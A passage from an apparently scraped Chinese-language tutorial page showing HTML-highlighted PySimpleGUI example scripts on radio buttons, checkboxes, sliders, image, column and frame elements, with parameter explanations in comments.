&#x27;-SP-&#x27;:</span></span><br><span class=\"line\">    <span class=\"comment\">#     window[&#x27;-YY-&#x27;].update(values[&#x27;-SP-&#x27;])</span></span><br><span class=\"line\">window.close()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"22单选框属性的设定及更新方法-py\"><a href=\"#22单选框属性的设定及更新方法-py\" class=\"headerlink\" title=\"22单选框属性的设定及更新方法.py\"></a>22单选框属性的设定及更新方法.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">1.单选框属性的设定及更新方法</span></span><br><span class=\"line\"><span class=\"string\">设定方法：sg.R(list,size=(None,None))</span></span><br><span class=\"line\"><span class=\"string\">更新方法：window[key].update()</span></span><br><span class=\"line\"><span class=\"string\">相同组ID的单选框都更新为未选中状态。</span></span><br><span class=\"line\"><span class=\"string\">window[key].ResetGroup()</span></span><br><span class=\"line\"><span class=\"string\">window[key].reset_group()</span></span><br><span class=\"line\"><span class=\"string\">-单选框可设定的属性</span></span><br><span class=\"line\"><span class=\"string\">text, # str 文本用于显示在单选框旁边</span></span><br><span class=\"line\"><span class=\"string\">group_id, # any # 组ID</span></span><br><span class=\"line\"><span class=\"string\">key=None,   # 元素的唯一标识符</span></span><br><span class=\"line\"><span class=\"string\">default=False, # bool如果为True，则默认选中</span></span><br><span class=\"line\"><span class=\"string\">enable_events=True, #  元素的事件属性，如果设定为True,元素列表项目被选中时会发生事件</span></span><br><span class=\"line\"><span class=\"string\">size=(30,6),   # 字符宽度，行高</span></span><br><span class=\"line\"><span class=\"string\">disabled=False, # 元素是否禁用</span></span><br><span class=\"line\"><span class=\"string\">auto_size_text=None,    #   如果为True,元素自动根据内容大小调整</span></span><br><span class=\"line\"><span class=\"string\">font=None,  # 设置字体名称或者大小</span></span><br><span class=\"line\"><span class=\"string\">background_color=None,  #   背景颜色设定</span></span><br><span class=\"line\"><span class=\"string\">text_color=None,    #   字体颜色设定</span></span><br><span class=\"line\"><span class=\"string\">pad=None,   # 元素间隔设定</span></span><br><span class=\"line\"><span class=\"string\">tooltip=None,   # 悬浮文本</span></span><br><span class=\"line\"><span class=\"string\">visible=True,   # 元素可见状态设定</span></span><br><span class=\"line\"><span class=\"string\">-单选框可更新的属性</span></span><br><span class=\"line\"><span class=\"string\">value=None, # 为True时，此单选框被选中，同组的其他选框更新为未选中</span></span><br><span class=\"line\"><span class=\"string\">text, # str 更新显示在按钮旁边的文本</span></span><br><span class=\"line\"><span class=\"string\">background_color=None,  #   更新背景颜色</span></span><br><span class=\"line\"><span class=\"string\">text_color=None,    #   更新文本颜色</span></span><br><span class=\"line\"><span class=\"string\">disabled=None, # 更新元素的禁用状态</span></span><br><span class=\"line\"><span class=\"string\">visible=None, # 更新元素的可见状态</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">2.单选框如何获取被选定的值(文本)</span></span><br><span class=\"line\"><span class=\"string\">items()函数：将字典里的（键，值）转换为元组</span></span><br><span class=\"line\"><span class=\"string\">获取方法：</span></span><br><span class=\"line\"><span class=\"string\">for k,v in dict:</span></span><br><span class=\"line\"><span class=\"string\">if v == True:</span></span><br><span class=\"line\"><span class=\"string\">print(k)</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> PySimpleGUI <span class=\"keyword\">as</span> sg</span><br><span class=\"line\">lista=[<span class=\"string\">&#x27;非常满意&#x27;</span>,<span class=\"string\">&#x27;满意&#x27;</span>,<span class=\"string\">&#x27;一般&#x27;</span>,<span class=\"string\">&#x27;不满意&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">layout=[</span><br><span class=\"line\">    [sg.T(<span class=\"string\">&#x27;请对程序员无声的课程做出评价：&#x27;</span>)],</span><br><span class=\"line\">    [sg.R(i,group_id=<span class=\"number\">1</span>,key=i) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> lista],</span><br><span class=\"line\">    [sg.B(<span class=\"string\">&#x27;确认提交&#x27;</span>)]</span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\">window=sg.Window(<span class=\"string\">&#x27;Python GUI&#x27;</span>, layout)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    event,values=window.read()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> event==<span class=\"literal\">None</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> event == <span class=\"string\">&#x27;确认提交&#x27;</span>:</span><br><span class=\"line\">        <span class=\"comment\"># window[&#x27;满意&#x27;].ResetGroup()</span></span><br><span class=\"line\">        <span class=\"comment\"># window[&#x27;满意&#x27;].update(value=True)</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> k,v <span class=\"keyword\">in</span> values.items():</span><br><span class=\"line\">            <span class=\"keyword\">if</span> v == <span class=\"literal\">True</span>:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(k)</span><br><span class=\"line\"></span><br><span class=\"line\">window.close()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"23复选框的设定及更新方法-py\"><a href=\"#23复选框的设定及更新方法-py\" class=\"headerlink\" title=\"23复选框的设定及更新方法.py\"></a>23复选框的设定及更新方法.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">书写方法：sg.Checkbox() or sg.CB()</span></span><br><span class=\"line\"><span class=\"string\">更新方法：window[key].update()</span></span><br><span class=\"line\"><span class=\"string\">-复选框可设定的属性</span></span><br><span class=\"line\"><span class=\"string\">text, # str 文本用于显示在单选框旁边</span></span><br><span class=\"line\"><span class=\"string\">key=None,   # 元素的唯一标识符</span></span><br><span class=\"line\"><span class=\"string\">default=False, # bool如果为True，则默认选中</span></span><br><span class=\"line\"><span class=\"string\">enable_events=True, #  元素的事件属性，如果设定为True,元素列表项目被选中时会发生事件</span></span><br><span class=\"line\"><span class=\"string\">size=(30,6),   # 字符宽度，行高</span></span><br><span class=\"line\"><span class=\"string\">disabled=False, # 元素是否禁用</span></span><br><span class=\"line\"><span class=\"string\">auto_size_text=None,    #   如果为True,元素自动根据内容大小调整</span></span><br><span class=\"line\"><span class=\"string\">font=None,  # 设置字体名称或者大小</span></span><br><span class=\"line\"><span class=\"string\">background_color=None,  #   背景颜色设定</span></span><br><span class=\"line\"><span class=\"string\">text_color=None,    #   字体颜色设定</span></span><br><span class=\"line\"><span class=\"string\">pad=None,   # 元素间隔设定</span></span><br><span class=\"line\"><span class=\"string\">tooltip=None,   # 悬浮文本</span></span><br><span class=\"line\"><span class=\"string\">visible=True,   # 元素可见状态设定</span></span><br><span class=\"line\"><span class=\"string\">-复选框可更新的属性</span></span><br><span class=\"line\"><span class=\"string\">value=None, # 为True时，此单选框被选中，同组的其他选框更新为未选中</span></span><br><span class=\"line\"><span class=\"string\">text, # str 更新显示在按钮旁边的文本</span></span><br><span class=\"line\"><span class=\"string\">background_color=None,  #   更新背景颜色</span></span><br><span class=\"line\"><span class=\"string\">text_color=None,    #   更新文本颜色</span></span><br><span class=\"line\"><span class=\"string\">disabled=None, # 更新元素的禁用状态</span></span><br><span class=\"line\"><span class=\"string\">visible=None, # 更新元素的可见状态</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> PySimpleGUI <span class=\"keyword\">as</span> sg</span><br><span class=\"line\">lista=[<span class=\"string\">&#x27;非常满意&#x27;</span>,<span class=\"string\">&#x27;满意&#x27;</span>,<span class=\"string\">&#x27;一般&#x27;</span>,<span class=\"string\">&#x27;不满意&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">layout=[</span><br><span class=\"line\">    [sg.T(<span class=\"string\">&#x27;请对程序员无声的课程做出评价：&#x27;</span>)],</span><br><span class=\"line\">    [sg.CB(i,key=i) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> lista],</span><br><span class=\"line\">    [sg.B(<span class=\"string\">&#x27;确认提交&#x27;</span>)]</span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\">window=sg.Window(<span class=\"string\">&#x27;Python GUI&#x27;</span>, layout)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    event,values=window.read()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> event==<span class=\"literal\">None</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> event == <span class=\"string\">&#x27;确认提交&#x27;</span>:</span><br><span class=\"line\">        <span class=\"comment\"># window[&#x27;满意&#x27;].ResetGroup()</span></span><br><span class=\"line\">        <span class=\"comment\"># window[&#x27;满意&#x27;].update(value=True)</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> k,v <span class=\"keyword\">in</span> values.items():</span><br><span class=\"line\">            <span class=\"keyword\">if</span> v == <span class=\"literal\">True</span>:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(k)</span><br><span class=\"line\"></span><br><span class=\"line\">window.close()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"24滑块元素的设定方法-py\"><a href=\"#24滑块元素的设定方法-py\" class=\"headerlink\" title=\"24滑块元素的设定方法.py\"></a>24滑块元素的设定方法.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">书写方法：</span></span><br><span class=\"line\"><span class=\"string\">sg.Slider()</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> PySimpleGUI <span class=\"keyword\">as</span> sg</span><br><span class=\"line\"></span><br><span class=\"line\">layout=[</span><br><span class=\"line\">    [sg.Slider(</span><br><span class=\"line\">        <span class=\"built_in\">range</span>=(<span class=\"number\">100</span>,<span class=\"number\">500</span>), <span class=\"comment\"># 滑块范围（最小值，最大值）</span></span><br><span class=\"line\">        key=<span class=\"literal\">None</span>, <span class=\"comment\"># 元素的唯一标识符</span></span><br><span class=\"line\">        default_value=<span class=\"number\">200</span>, <span class=\"comment\"># 滑块初始所处位置</span></span><br><span class=\"line\">        resolution=<span class=\"number\">10</span>, <span class=\"comment\"># 滑块值变动的最小单位值</span></span><br><span class=\"line\">        tick_interval=<span class=\"number\">50</span>,<span class=\"comment\"># 刻度值标记</span></span><br><span class=\"line\">        orientation=<span class=\"string\">&#x27;h&#x27;</span>, <span class=\"comment\"># 方向设定  水平方向或者垂直方向，有效值&#x27;horizontal&#x27; or &#x27;vertical&#x27;，支持简写：&#x27;h&#x27; or &#x27;v&#x27;</span></span><br><span class=\"line\">        disable_number_display=<span class=\"literal\">False</span>, <span class=\"comment\"># 默认为False，如果为True，滑块旁的数字不显示</span></span><br><span class=\"line\">        border_width=<span class=\"literal\">None</span>, <span class=\"comment\"># 边界线宽度</span></span><br><span class=\"line\">        relief=<span class=\"literal\">None</span>, <span class=\"comment\"># 浮雕设计&#x27;raised&#x27;, &#x27;sunken&#x27;, &#x27;flat&#x27;, &#x27;ridge&#x27;, &#x27;solid&#x27;, &#x27;groove&#x27;,</span></span><br><span class=\"line\">        size=(<span class=\"number\">30</span>,<span class=\"number\">6</span>),   <span class=\"comment\"># 宽度，行高</span></span><br><span class=\"line\">        font=<span class=\"literal\">None</span>,  <span class=\"comment\"># 设置字体名称或者大小</span></span><br><span class=\"line\">        background_color=<span class=\"literal\">None</span>,  <span class=\"comment\">#   背景颜色设定</span></span><br><span class=\"line\">        text_color=<span class=\"literal\">None</span>,    <span class=\"comment\">#   字体颜色设定</span></span><br><span class=\"line\">        pad=<span class=\"literal\">None</span>,   <span class=\"comment\"># 元素间隔设定</span></span><br><span class=\"line\">        tooltip=<span class=\"literal\">None</span>,   <span class=\"comment\"># 悬浮文本</span></span><br><span class=\"line\">        visible=<span class=\"literal\">True</span>,   <span class=\"comment\"># 元素可见状态设定</span></span><br><span class=\"line\">    )]</span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\">window=sg.Window(<span class=\"string\">&#x27;Python GUI&#x27;</span>, layout)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    event,values=window.read()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> event==<span class=\"literal\">None</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\">window.close()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"25滑块元素的更新方法-py\"><a href=\"#25滑块元素的更新方法-py\" class=\"headerlink\" title=\"25滑块元素的更新方法.py\"></a>25滑块元素的更新方法.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">window[key].update()</span></span><br><span class=\"line\"><span class=\"string\">window[key].Update()</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">可更新的属性</span></span><br><span class=\"line\"><span class=\"string\">value=None, # int or float</span></span><br><span class=\"line\"><span class=\"string\">range=(None,None), # (int,int) or (float,float)</span></span><br><span class=\"line\"><span class=\"string\">disabled=None, # bool</span></span><br><span class=\"line\"><span class=\"string\">visible=None # bool</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> PySimpleGUI <span class=\"keyword\">as</span> sg</span><br><span class=\"line\"></span><br><span class=\"line\">layout=[</span><br><span class=\"line\">    [sg.Slider(key=<span class=\"string\">&#x27;-S-&#x27;</span>,)],</span><br><span class=\"line\">    [sg.B(<span class=\"string\">&#x27;update&#x27;</span>)]</span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\">window=sg.Window(<span class=\"string\">&#x27;Python GUI&#x27;</span>, layout)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    event,values=window.read()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> event==<span class=\"literal\">None</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> event == <span class=\"string\">&#x27;update&#x27;</span>:</span><br><span class=\"line\">        window[<span class=\"string\">&#x27;-S-&#x27;</span>].update(</span><br><span class=\"line\">            value=<span class=\"literal\">None</span>, <span class=\"comment\"># int or float滑块初始所处位置</span></span><br><span class=\"line\">            <span class=\"built_in\">range</span>=(<span class=\"number\">100</span>,<span class=\"number\">500</span>), <span class=\"comment\"># 滑块范围(最小值，最大值)</span></span><br><span class=\"line\">            disabled=<span class=\"literal\">None</span>, <span class=\"comment\"># bool 元素的禁用状态</span></span><br><span class=\"line\">            visible=<span class=\"literal\">None</span>, <span class=\"comment\"># 元素是否显示</span></span><br><span class=\"line\">        )</span><br><span class=\"line\"></span><br><span class=\"line\">window.close()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"26图片元素的多种书写方式-py\"><a href=\"#26图片元素的多种书写方式-py\" class=\"headerlink\" title=\"26图片元素的多种书写方式.py\"></a>26图片元素的多种书写方式.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">书写方法：</span></span><br><span class=\"line\"><span class=\"string\">sg.Image(filename=&#x27;图片路径&#x27;) # 图片路径仅支持GIF和PNG</span></span><br><span class=\"line\"><span class=\"string\">for循环布局多张图片的方法：</span></span><br><span class=\"line\"><span class=\"string\">横向 [sg.Image(filename=img+f&#x27;&#123;i&#125;.png&#x27;) for i in range(1,4)]</span></span><br><span class=\"line\"><span class=\"string\">纵向 [[sg.Image(filename=img+f&#x27;&#123;i&#125;.png&#x27;)] for i in range(1,4)]</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">f-string格式化字符串常量</span></span><br><span class=\"line\"><span class=\"string\">python3.6新引入的一种字符串格式化方法。目的是使格式化字符串的操作更加简便。</span></span><br><span class=\"line\"><span class=\"string\">大括号&#123;&#125;标明被替换的字段</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> PySimpleGUI <span class=\"keyword\">as</span> sg</span><br><span class=\"line\">img=<span class=\"string\">r&quot;c:\\bl&quot;</span></span><br><span class=\"line\">layout=[</span><br><span class=\"line\">    [[sg.Image(filename=img+<span class=\"string\">f&#x27;<span class=\"subst\">&#123;i&#125;</span>.png&#x27;</span>)] <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">6</span>)]</span><br><span class=\"line\">    <span class=\"comment\"># [sg.Image(filename=img)]</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\">window=sg.Window(<span class=\"string\">&#x27;Python GUI&#x27;</span>, layout)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    event,values=window.read()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> event==<span class=\"literal\">None</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\">window.close()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"27图片元素的设定及更新方法-py\"><a href=\"#27图片元素的设定及更新方法-py\" class=\"headerlink\" title=\"27图片元素的设定及更新方法.py\"></a>27图片元素的设定及更新方法.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">图片元素可设定的属性</span></span><br><span class=\"line\"><span class=\"string\">filename=None, # 图片路径仅支持GIF和PNG</span></span><br><span class=\"line\"><span class=\"string\">data=None, # base64编码的字符串</span></span><br><span class=\"line\"><span class=\"string\">background_color=None,  # 背景颜色设定</span></span><br><span class=\"line\"><span class=\"string\">size=(None,None) # 图片宽度和高度设定(pix)</span></span><br><span class=\"line\"><span class=\"string\">pad=None, # 和周围元素间的间隔（（左右）（上下））</span></span><br><span class=\"line\"><span class=\"string\">key=None, # 元素的唯一标识符</span></span><br><span class=\"line\"><span class=\"string\">tooltip=None,   # 悬浮文本</span></span><br><span class=\"line\"><span class=\"string\">visible=True,   # 元素可见状态设定</span></span><br><span class=\"line\"><span class=\"string\">right_click_menu=None, # 右击调出菜单</span></span><br><span class=\"line\"><span class=\"string\">enable_events=False, # 元素事件属性，默认为False</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">更新方法及可更新的属性</span></span><br><span class=\"line\"><span class=\"string\">window[key].update()</span></span><br><span class=\"line\"><span class=\"string\">window[key].Update()</span></span><br><span class=\"line\"><span class=\"string\">filename=None, # 更新图片路径</span></span><br><span class=\"line\"><span class=\"string\">data=None, # 更新base64编码的字符串</span></span><br><span class=\"line\"><span class=\"string\">visible=True,   # 更新元素可见状态</span></span><br><span class=\"line\"><span class=\"string\">size=(None,None) # 图片宽度和高度设定(pix)</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">图片元素的动图更新方法</span></span><br><span class=\"line\"><span class=\"string\">window[key].update_animation()</span></span><br><span class=\"line\"><span class=\"string\">window[key].UpdateAnimation()</span></span><br><span class=\"line\"><span class=\"string\">可更新的属性：</span></span><br><span class=\"line\"><span class=\"string\">source, # 包含动画GIF的文件名或Base64编码的字符串</span></span><br><span class=\"line\"><span class=\"string\">time_between_frames=0, # 显示帧之间要等待的毫秒数</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> PySimpleGUI <span class=\"keyword\">as</span> sg</span><br><span class=\"line\">img=<span class=\"string\">r&quot;c:\\bl1.png&quot;</span></span><br><span class=\"line\">base64_bl3= <span class=\"string\">b&#x27;&#x27;</span></span><br><span class=\"line\">base64_gif=sg.DEFAULT_BASE64_LOADING_GIF</span><br><span class=\"line\">layout=[</span><br><span class=\"line\">    <span class=\"comment\"># [sg.Image(filename=img)]</span></span><br><span class=\"line\">    [sg.Image(data=base64_gif,key=<span class=\"string\">&#x27;-GIF-&#x27;</span>)]</span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\">window=sg.Window(<span class=\"string\">&#x27;Python GUI&#x27;</span>, layout)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    event,values=window.read(timeout=<span class=\"number\">10</span>)</span><br><span class=\"line\">    window[<span class=\"string\">&#x27;-GIF-&#x27;</span>].update_animation(source=base64_gif,time_between_frames=<span class=\"number\">100</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> event==<span class=\"literal\">None</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\">window.close()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"28列元素的书写及设定方式-py\"><a href=\"#28列元素的书写及设定方式-py\" class=\"headerlink\" title=\"28列元素的书写及设定方式.py\"></a>28列元素的书写及设定方式.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">书写方法：</span></span><br><span class=\"line\"><span class=\"string\">sg.Column() or sg.Col()</span></span><br><span class=\"line\"><span class=\"string\">一个容器元素，用于在窗口的布局中创建布局</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> PySimpleGUI <span class=\"keyword\">as</span> sg</span><br><span class=\"line\"></span><br><span class=\"line\">layoutL=[</span><br><span class=\"line\">    [sg.T(<span class=\"string\">&#x27;标题&#x27;</span>)],</span><br><span class=\"line\">    [sg.In(<span class=\"string\">&#x27;请输入文章标题&#x27;</span>)],</span><br><span class=\"line\">    [sg.T(<span class=\"string\">&#x27;作者&#x27;</span>)],</span><br><span class=\"line\">    [sg.In(<span class=\"string\">&#x27;请输入姓名或笔名&#x27;</span>)]</span><br><span class=\"line\">]</span><br><span class=\"line\">layoutR=[</span><br><span class=\"line\">    [sg.ML(<span class=\"string\">&#x27;请输入正文内容&#x27;</span>,size=(<span class=\"number\">30</span>,<span class=\"number\">20</span>))],</span><br><span class=\"line\">    [sg.B(<span class=\"string\">&#x27;确认提交&#x27;</span>)]</span><br><span class=\"line\">]</span><br><span class=\"line\">layout=[</span><br><span class=\"line\">    [sg.Col(layoutL,</span><br><span class=\"line\">            background_color=<span class=\"string\">&#x27;black&#x27;</span>,  <span class=\"comment\"># 整栏背景色</span></span><br><span class=\"line\">            <span class=\"comment\"># size=None, # 宽度和高度设定(pix),偶尔不工作</span></span><br><span class=\"line\">            pad=<span class=\"literal\">None</span>, <span class=\"comment\"># 和周围元素间的间隔（（左右）（上下））</span></span><br><span class=\"line\">            scrollable=<span class=\"literal\">None</span>, <span class=\"comment\"># 如果为True，则滚动条将添加到该列</span></span><br><span class=\"line\">            vertical_scroll_only=<span class=\"literal\">None</span>, <span class=\"comment\"># 如果为True,则不会显示水平滚动条</span></span><br><span class=\"line\">            right_click_menu=<span class=\"literal\">None</span>, <span class=\"comment\"># 右击调出菜单</span></span><br><span class=\"line\">            key=<span class=\"literal\">None</span>, <span class=\"comment\"># 元素的唯一标识符</span></span><br><span class=\"line\">            visible=<span class=\"literal\">True</span>,   <span class=\"comment\"># 元素可见状态设定</span></span><br><span class=\"line\">            justification=<span class=\"string\">&quot;left&quot;</span>, <span class=\"comment\"># 为列本身设置对齐方式</span></span><br><span class=\"line\">            element_justification=<span class=\"string\">&quot;center&quot;</span>, <span class=\"comment\"># 列内所有元素的对齐方式，有效值为left,center,right</span></span><br><span class=\"line\">            vertical_alignment=<span class=\"string\">&#x27;top&#x27;</span>, <span class=\"comment\"># 垂直对齐方式，有效值为top, bottom, center</span></span><br><span class=\"line\">            grab=<span class=\"literal\">True</span>, <span class=\"comment\"># 如果设定为True，可以拖拽此元素移动窗口</span></span><br><span class=\"line\">            expand_x=<span class=\"literal\">None</span>, <span class=\"comment\"># 如果为True，则列将自动沿X方向扩展以填充可用空间</span></span><br><span class=\"line\">            expand_y=<span class=\"literal\">True</span>, <span class=\"comment\"># 如果为True，则列将自动沿y方向扩展以填充可用空间</span></span><br><span class=\"line\"></span><br><span class=\"line\">            ),sg.Col(layoutR)]</span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\">window=sg.Window(<span class=\"string\">&#x27;Python GUI&#x27;</span>, layout)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    event,values=window.read()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> event==<span class=\"literal\">None</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\">window.close()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"29框架元素的书写及设定方法-py\"><a href=\"#29框架元素的书写及设定方法-py\" class=\"headerlink\" title=\"29框架元素的书写及设定方法.py\"></a>29框架元素的书写及设定方法.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> PySimpleGUI <span class=\"keyword\">as</span> sg</span><br><span class=\"line\"></span><br><span class=\"line\">layouta=[</span><br><span class=\"line\">    [sg.T(<span class=\"string\">&#x27;账号&#x27;</span>),sg.In()],</span><br><span class=\"line\">    [sg.T(<span class=\"string\">&#x27;密码&#x27;</span>),sg.In()]</span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\">layout=[</span><br><span class=\"line\">\t[sg.Frame(title=<span class=\"string\">&#x27;登录框&#x27;</span>,layout=layouta,</span><br><span class=\"line\">            title_color=<span class=\"literal\">None</span>, <span class=\"comment\"># 标题文本颜色设定</span></span><br><span class=\"line\">            background_color=<span class=\"string\">&#x27;black&#x27;</span>,  <span class=\"comment\"># 框架背景色</span></span><br><span class=\"line\">            title_location=<span class=\"literal\">None</span>, <span class=\"comment\"># 标题所处位置，有效值有12种（ewsn东南西北），n,nw,ne,e,en,es,s,se,sw,w,ws,wn,nw(default)</span></span><br><span class=\"line\">            relief=<span class=\"literal\">None</span>,  <span class=\"comment\"># 浮雕设计&#x27;raised&#x27;, &#x27;sunken&#x27;, &#x27;flat&#x27;, &#x27;ridge&#x27;, &#x27;solid&#x27;, &#x27;groove&#x27;,</span></span><br><span class=\"line\">            size=(<span class=\"literal\">None</span>,<span class=\"literal\">None</span>), <span class=\"comment\"># 宽度和高度设定(pix),偶尔不工作</span></span><br><span class=\"line\">            pad=<span class=\"literal\">None</span>, <span class=\"comment\"># 和周围元素间的间隔（（左右）（上下））</span></span><br><span class=\"line\">            font=<span class=\"literal\">None</span>, <span class=\"comment\"># 可以设置字体名称，大小等。</span></span><br><span class=\"line\">            border_width=<span class=\"number\">10</span>, <span class=\"comment\"># 框架元素的线条宽度</span></span><br><span class=\"line\">            tooltip=<span class=\"literal\">None</span>, <span class=\"comment\"># 悬浮文本</span></span><br><span class=\"line\">            right_click_menu=<span class=\"literal\">None</span>, <span class=\"comment\"># 右击调出菜单</span></span><br><span class=\"line\">            key=<span class=\"literal\">None</span>, <span class=\"comment\"># 元素的唯一标识符</span></span><br><span class=\"line\">            visible=<span class=\"literal\">True</span>,   <span class=\"comment\"># 元素可见状态设定</span></span><br><span class=\"line\">            element_justification=<span class=\"string\">&quot;center&quot;</span>, <span class=\"comment\"># 列内所有元素的对齐方式，有效值为left,center,right</span></span><br><span class=\"line\">            vertical_alignment=<span class=\"string\">&#x27;top&#x27;</span>, <span class=\"comment\"># 垂直对齐方式，有效值为top, bottom, center</span></span><br><span class=\"line\">              )]</span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\">window=sg.Window(<span class=\"string\">&#x27;Python GUI&#x27;</span>, layout)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    event,values=window.read(timeout=<span class=\"number\">10</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span> event==<span class=\"literal\">None</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span 